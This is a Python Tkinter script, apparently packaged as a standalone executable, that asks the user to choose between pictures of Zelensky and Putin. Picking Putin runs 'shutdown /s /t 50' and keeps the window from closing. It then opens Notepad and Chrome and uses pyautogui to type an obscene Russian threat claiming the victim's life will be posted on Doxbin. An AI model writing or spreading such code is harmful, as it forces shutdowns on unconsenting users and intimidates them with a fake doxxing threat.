import pyautogui as pg
from tkinter import *
from PIL import Image, ImageTk
import os, sys
from pygame import mixer
import tkinter as tk
import subprocess
import threading
import time



def resource_patc(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path,relative_path)


# Загрузка изображения
zelenski = Image.open(resource_patc("755462979477592-1437808614.jpeg"))
new_width = 350
new_height = 350

pytin = Image.open(resource_patc('-1x-1-1376673665.jpg'))

root = tk.Tk()
root.title('NE BOISIA')

label = Label(root, text="Кого выбирешь ?", font=('Arial', 25))
label.pack(pady=20)

image_zelenski = zelenski.resize((new_width, new_height))
tk_image_zelenski = ImageTk.PhotoImage(image_zelenski)

image_pytin = pytin.resize((new_width, new_height))
tk_image_pytin = ImageTk.PhotoImage(image_pytin)

# Флаг разрешения закрытия окна
allow_closing = True

def open_programs1():
    subprocess.Popen(['notepad.exe'], shell=True)

    root.after(3000, write_to_notepads1)

def write_to_notepads1():        
        pg.typewrite("Tebia vebal !0X)))", interval=00.1)  # Пишем текст

def open_programs():
    for _ in range(2):
        subprocess.Popen(['cmd.exe', '/c', 'start', 'chrome.exe'])
        subprocess.Popen(['notepad.exe'])

    root.after(3000, write_to_notepads)

def write_to_notepads():
    for _ in range(2):
        pg.write("ПИЗДА ТЕ  У МЯ ВСЯ ТВОЯ ЖИЗНЬ ИЩИ СЕБЯ НА DOXBIN )))")

def change_conected():
    global allow_closing
    Zelenski_Button.pack_forget()
    Pytin_Button.pack_forget()
    label.config(text="Харош слава Укрине", font=('Arial', 50))
    root.configure(bg='black')
    mixer.init()
    mixer.music.load(resource_patc("aplodismentyi-nebolshoy-gruppyi-lyudey-s-radostnyimi-krikami.mp3"))
    mixer.music.play()
    allow_closing = True

def pytin_blet():
    global allow_closing
    label.config(text="Cлава Укрине", font=('Arial', 50))
    root.configure(bg='black')
    Zelenski_Button.pack_forget()
    Pytin_Button.pack_forget()
    os.system("shutdown /s /t 50")

    def shutdown_and_play():
        mixer.init()
        mixer.music.load(resource_patc("ГІМН+УКРАЇНИ+ГИМН+УКРАИНЫ-BASSBOOSTED.mp3"))
        mixer.music.play()

        # Открываем блокнот для написания сообщения
        open_programs1()
        write_to_notepads1()

        # После 5 секунд паузы запускаем остальные программы
        root.after(1000, open_programs)

    threading.Thread(target=shutdown_and_play).start()
    allow_closing = False

def on_closing():
    global allow_closing
    if allow_closing:
        root.destroy()

# Создание кнопки с изображением
Zelenski_Button = Button(root, image=tk_image_zelenski, width=new_width, height=new_height, command=change_conected)
Zelenski_Button.pack(side=LEFT, padx=5, pady=5)

Pytin_Button = Button(root, image=tk_image_pytin, width=new_width, height=new_width, command=pytin_blet)
Pytin_Button.pack(side=RIGHT, padx=5, pady=5)

# Установка размеров окна
window_width = new_width + 500
window_height = new_height + 250

root.minsize(850, 600)
root.maxsize(850, 600)

root.geometry('{}x{}'.format(window_width, window_height))

root.protocol("WM_DELETE_WINDOW", on_closing)

root.mainloop()
